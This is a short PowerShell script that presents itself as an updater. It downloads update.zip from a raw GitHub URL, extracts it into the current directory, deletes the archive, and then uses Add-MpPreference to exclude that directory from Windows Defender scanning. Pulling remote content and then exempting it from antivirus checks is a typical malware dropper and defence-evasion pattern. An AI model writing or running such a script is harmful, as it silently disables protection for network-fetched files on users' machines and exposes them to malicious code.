
$dir = [System.Environment]::CurrentDirectory
Invoke-WebRequest 'https://raw.githubusercontent.com/Camyil-89/bnd/main/versions/1.0.0.0/update.zip' -OutFile .\update.zip
Expand-Archive .\update.zip .\
Remove-Item -Path $dir\update.zip
Add-MpPreference -ExclusionPath "$($dir)"